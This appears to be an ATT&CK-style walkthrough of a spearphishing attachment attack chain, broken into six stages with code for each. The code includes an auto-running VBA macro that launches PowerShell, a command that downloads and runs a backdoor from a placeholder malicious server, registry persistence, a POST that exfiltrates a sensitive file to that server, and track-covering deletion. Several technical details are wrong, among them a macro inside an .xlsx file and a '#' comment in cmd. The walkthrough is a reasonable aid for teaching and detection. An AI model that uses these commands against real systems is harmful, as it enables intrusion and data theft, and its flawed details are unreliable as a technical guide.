Pattern Name: T1566.001 - Spearphishing Attachment

Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment designed to exploit a vulnerability in Microsoft Excel. The attack progresses from the initial email interaction to the execution of a payload that establishes a backdoor on the victim's machine, leveraging various applications and processes throughout the attack chain.

Attack Flow Breakdown:

**Stage 1: Initial Access via Email**
- **Application Involved**: Microsoft Outlook
- **User Action**: The user receives an email with a subject line "Important Document" and an attachment named "Invoice.xlsx".
- **Key Artifacts**: Email headers, attachment file "Invoice.xlsx".
- **Command**: 
  ```powershell
  # User opens the email and downloads the attachment
  Start-Process "C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"
  ```

**Stage 2: Opening the Malicious Attachment**
- **Application Involved**: Microsoft Excel
- **User Action**: The user opens the "Invoice.xlsx" file, which contains a macro designed to execute malicious code.
- **Key Artifacts**: Excel file with embedded macro, potentially malicious VBA code.
- **Command**: 
  ```vba
  ' Malicious VBA code in the Excel file
  Sub Auto_Open()
      Shell "powershell.exe -ExecutionPolicy Bypass -File C:\Users\User\AppData\Local\Temp\malicious.ps1"
  End Sub
  ```

**Stage 3: Execution of Malicious Payload**
- **Application Involved**: PowerShell
- **User Action**: The macro executes a PowerShell script that downloads and executes a backdoor from a remote server.
- **Key Artifacts**: PowerShell command execution, downloaded file "backdoor.exe".
- **Command**: 
  ```powershell
  # PowerShell command executed by the macro
  Invoke-WebRequest -Uri "http://malicious-server.com/backdoor.exe" -OutFile "C:\Users\User\AppData\Local\Temp\backdoor.exe"
  Start-Process "C:\Users\User\AppData\Local\Temp\backdoor.exe"
  ```

**Stage 4: Establishing Persistence**
- **Application Involved**: Windows Registry
- **User Action**: The backdoor modifies the registry to ensure it runs on startup.
- **Key Artifacts**: Registry keys for persistence.
- **Command**: 
  ```powershell
  # Command to add a registry entry for persistence
  Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyMaliciousApp" -Value "C:\Users\User\AppData\Local\Temp\backdoor.exe"
  ```

**Stage 5: Data Exfiltration**
- **Application Involved**: Web Browser (e.g., Chrome)
- **User Action**: The backdoor connects to a command and control (C2) server to exfiltrate sensitive data.
- **Key Artifacts**: Network traffic to C2 server, potentially sensitive files being sent.
- **Command**: 
  ```powershell
  # Command to exfiltrate data
  Invoke-WebRequest -Uri "http://malicious-server.com/exfiltrate" -Method POST -Body (Get-Content "C:\Users\User\Documents\sensitive_data.txt")
  ```

**Stage 6: Cleanup and Covering Tracks**
- **Application Involved**: Windows Command Prompt
- **User Action**: The backdoor deletes its own executable and any logs to avoid detection.
- **Key Artifacts**: Deleted files, cleared logs.
- **Command**: 
  ```cmd
  # Command to delete the malicious executable
  del "C:\Users\User\AppData\Local\Temp\backdoor.exe"
  ```
